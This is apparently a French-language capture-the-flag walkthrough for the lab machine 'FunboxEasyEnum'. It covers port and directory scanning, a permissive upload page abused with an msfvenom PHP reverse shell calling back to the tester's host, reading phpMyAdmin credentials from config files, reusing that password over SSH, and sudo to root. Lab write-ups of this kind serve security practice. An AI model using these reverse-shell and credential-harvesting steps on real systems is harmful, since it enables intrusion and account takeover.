# FunboxEasyEnum

	sudo masscan -p1-65535,U:1-65535 192.168.249.132 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.249.132 -oN nmap.txt
	feroxbuster --silent -u http://192.168.249.132

Scans classiques.

	PORT STATE SERVICE VERSION  
	22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
	80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
	
=> http://192.168.249.132/robots.txt => "Allow: Enum_this_Box"
</br>=> http://192.168.249.132/phpmyadmin/

Fuzzing : 

	ffuf -u http://192.168.249.132/Enum_this_Box/FUZZ -w  ~/wordlists/dirb_big.txt  -e .pdf,.php,.txt,.ini,.conf,.log,.html,.js,.bak,.aspx,.asp,.zip -fc 403
	ffuf -u http://192.168.249.132/FUZZ -w  ~/wordlists/dirb_big.txt  -e .pdf,.php,.txt,.ini,.conf,.log,.html,.js,.bak,.aspx,.asp,.zip -fc 403

=> http://192.168.249.132/mini.php

Il y a une fonctionnalité d'upload qui a l'air très permissive.

	msfvenom -p php/reverse_php LHOST=192.168.45.158 LPORT=443 -f raw > rev.php
	...
	curl http://192.168.249.132/rev.php
	rlwrap nc -nvlp 443
	...
	cat ../local.txt
	
### Pivoting et élévation de privilèges : 

	cat /etc/phpmyadmin/*

> $dbuser='phpmyadmin';  
> $dbpass='tgbzhnujm!';

	ls /home -la
	==========
	ssh goat@192.168.249.132    # FAIL
	ssh harry@192.168.249.132   # FAIL
	ssh sally@192.168.249.132   # FAIL
	ssh karla@192.168.249.132   # OK

	sudo -l 
	sudo -i
	cat /root/proof.txt
	
